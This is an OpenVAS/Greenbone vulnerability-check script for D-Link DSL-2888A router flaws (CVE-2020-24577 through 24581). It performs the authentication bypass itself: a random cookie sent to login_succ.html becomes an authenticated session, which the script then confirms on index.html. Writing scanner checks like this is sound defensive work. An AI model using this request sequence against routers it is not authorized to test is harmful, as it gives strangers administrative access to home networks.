# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117117");
  script_version("2025-06-26T05:40:52+0000");
  script_tag(name:"last_modification", value:"2025-06-26 05:40:52 +0000 (Thu, 26 Jun 2025)");
  script_tag(name:"creation_date", value:"2020-12-22 07:20:28 +0000 (Tue, 22 Dec 2020)");
  script_tag(name:"cvss_base", value:"7.7");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-12-23 02:48:00 +0000 (Wed, 23 Dec 2020)");

  script_cve_id("CVE-2020-24577", "CVE-2020-24578", "CVE-2020-24579", "CVE-2020-24580", "CVE-2020-24581");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DSL-2888A < AU_2.31_V1.1.47ae55 Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_dependencies("gb_dlink_dsl_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("d-link/dsl/http/detected");

  script_tag(name:"summary", value:"D-Link DSL-2888A devices are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if it is possible to
  elevate privileges.");

  script_tag(name:"impact", value:"This issue may be exploited by a remote attacker to gain access to
  sensitive information or modify system configuration.");

  script_tag(name:"affected", value:"DSL-2888A devices prior to firmware version
  AU_2.31_V1.1.47ae55.");

  script_tag(name:"solution", value:"Update to firmware version AU_2.31_V1.1.47ae55 or later.");

  script_xref(name:"URL", value:"https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=28241");
  script_xref(name:"URL", value:"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10194");

  exit(0);
}

# nb: We're testing all DSL devices as experiences have shown that other models might be affected as well.
CPE_PREFIX = "cpe:/o:dlink";

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("list_array_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www" ) )
  exit( 0 );

port = infos["port"];
CPE = infos["cpe"];

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url1 = "/page/login/login_succ.html";
cookie = "uid=" + rand_str( length:10 ); # nb: This is the cookie which is authenticated when doing the direct access to the URL above.

req1 = http_get_req( port:port, url:url1, add_headers:make_array( "Cookie", cookie ) );
res1 = http_keepalive_send_recv( port:port, data:req1 );
if( ! res1 || 'top.location.href = "/index.html";' >!< res1 )
  exit( 0 );

url2 = "/index.html";
req2 = http_get_req( port:port, url:url2, add_headers:make_array( "Cookie", cookie ) );
res2 = http_keepalive_send_recv( port:port, data:req2 );
if( ! res2 )
  exit( 0 );

# nb: Older firmware (EG_1.00) and fixed firmware (AU_2.31) will redirect to /page/login/login.html again.
if( 'label id="index_Show_MacAddress">' >< res2 || "Click on the pencil icon to give the device a name to make it easy to identify" >< res2 ||
    '<div class="goto_icon"><img src="/skin/gotosettings.png"' >< res2 || "A new firmware is available! Do you want to download and upgrade the firmware?" >< res2 ) {

  info["HTTP method"] = "GET";
  info["Cookie"] = cookie;
  info["URL"] = http_report_vuln_url( port:port, url:url1, url_only:TRUE );

  report  = 'By doing the following request:\n\n';
  report += text_format_table( array:info ) + '\n\n';
  report += 'it was possible to elevate the privileges of the Cookie to an authenticated session.\n\n';
  report += 'Any follow-up request including this Cookie allows access to the device without a previous valid login.';

  expert_info  = 'Request:\n'+ req1 + '\nResponse:\n' + res1;
  security_message( port:port, data:report, expert_info:expert_info );
  exit( 0 );
}

exit( 99 );
